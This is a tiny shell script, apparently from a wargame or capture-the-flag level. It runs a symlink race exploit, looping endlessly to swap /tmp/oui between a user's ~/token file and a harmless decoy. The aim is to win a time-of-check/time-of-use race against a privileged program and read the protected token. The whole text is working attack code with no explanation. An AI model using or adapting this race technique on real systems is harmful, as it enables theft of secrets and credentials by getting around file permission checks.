#!/bin/sh

echo oui > /tmp/non
while true;
    do
   	ln -fs ~/token /tmp/oui;
	ln -fs /tmp/non /tmp/oui;
done;